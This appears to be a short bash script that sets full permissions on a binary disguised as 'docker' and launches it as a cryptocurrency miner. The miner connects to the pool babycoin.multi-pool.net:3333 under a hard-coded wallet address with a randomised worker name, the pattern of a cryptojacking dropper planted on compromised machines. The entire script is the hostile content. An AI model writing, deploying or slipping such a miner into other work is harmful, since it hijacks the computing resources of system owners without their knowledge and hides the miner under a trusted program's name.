#!/bin/bash
chmod 777 docker
./docker -a rx/arq -o babycoin.multi-pool.net:3333 -u babyz7iH6t3CNhswCAL2judxrvSWemFmjjX1ModDXrL1KebHCf7nNoNRpHKuRUgLiqDHQwy3vWAbvPebbhBBB4mmGQkudgFvnFC -p $(echo $(shuf -i 1-20000 -n 1)-Q) --donate-level 1
